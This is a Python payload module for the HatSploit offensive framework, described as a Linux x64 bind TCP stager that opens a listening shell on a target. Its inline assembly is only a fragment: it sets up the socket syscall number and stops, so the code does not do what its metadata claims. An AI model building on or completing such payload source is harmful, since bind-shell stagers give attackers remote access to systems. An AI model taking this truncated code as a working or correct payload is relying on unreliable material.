#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.payload import Payload
from hatsploit.utils.payload import PayloadTools


class HatSploitPayload(Payload, PayloadTools):
    details = {
        'Category': "stager",
        'Name': "Linux x64 Metaphor Bind TCP",
        'Payload': "linux/x64/metaphor_bind_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer'
        ],
        'Description': "Metaphor bind TCP payload for Linux x64.",
        'Architecture': "x64",
        'Platform': "linux",
        'Rank': "low",
        'Type': "bind_tcp"
    }

    def run(self):
        return self.assemble(
            self.details['Architecture'],
            """
            start:
                xor r14, r14
                push 0x29
                pop rax
            """
        )
